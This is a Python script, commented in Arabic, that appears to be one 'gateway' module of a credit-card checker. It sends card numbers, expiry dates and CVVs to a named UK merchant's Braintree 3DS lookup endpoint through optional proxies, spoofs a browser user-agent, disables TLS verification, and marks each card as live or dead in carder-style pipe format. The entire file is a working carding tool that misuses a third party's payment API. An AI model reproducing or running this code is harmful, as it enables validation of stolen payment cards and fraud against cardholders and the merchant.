"""
بوابة الدفع: Braintree 3DS Secure LookUp 3
الموقع: www.thesolarcentre.co.uk
نوع البوابة: Braintree 3DS Secure LookUp
تدفق الطلبات:
1. POST https://api.braintreegateway.com/merchants/4fgx59fpr6338yxd/client_api/v1/payment_methods/visa/three_d_secure/lookup -> التحقق من حالة 3DS
"""
import aiohttp
import asyncio
import uuid
import ssl

MERCHANT_ID = "4fgx59fpr6338yxd"
MERCHANT_SITE = "www.thesolarcentre.co.uk"
LOOKUP_URL = f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/visa/three_d_secure/lookup"


async def req1_3ds_lookup(
    session: aiohttp.ClientSession,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 1: إجراء 3DS Secure LookUp مباشرة."""
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
    }
    data = {
        "amount": "10.00",
        "additionalInfo": {
            "billingLine1": "123 Street",
            "billingCity": "London",
            "billingPostalCode": "E1 6AN",
            "billingCountryCodeAlpha2": "GB",
        },
        "creditCard": {
            "number": cc,
            "expirationMonth": mm,
            "expirationYear": yy,
            "cvv": cvv,
        },
        "braintreeLibraryVersion": "braintree-web/3.85.2",
        "dfReferenceId": str(uuid.uuid4()),
        "clientMetadata": {"requestedThreeDSecureVersion": "2"},
    }
    try:
        async with session.post(
            LOOKUP_URL,
            json=data,
            headers=headers,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req1_3ds_lookup failed: {e}") from e


async def process_B3_LookUp3_secure(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Secure LookUp 3."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            res = await req1_3ds_lookup(session, cc, mes, ano, cvv, proxy_url)

    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "lookup" in res:
        lookup_data = res.get("lookup", {})
        three_d_status = lookup_data.get("threeDSecureInfo", {}).get("status", "")
        if three_d_status == "lookup_enrolled":
            return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Enrolled / Verify Passed"
        elif three_d_status == "lookup_not_enrolled":
            return f"✅ | {cc}|{mes}|{ano}|{cvv}", "3DS Not Enrolled / Passed"
        else:
            return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"3DS Status: {three_d_status}"
    elif "error" in res:
        msg = res.get("error", {}).get("message", "Unknown Error")
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", msg
    else:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", "Unexpected Response Format"
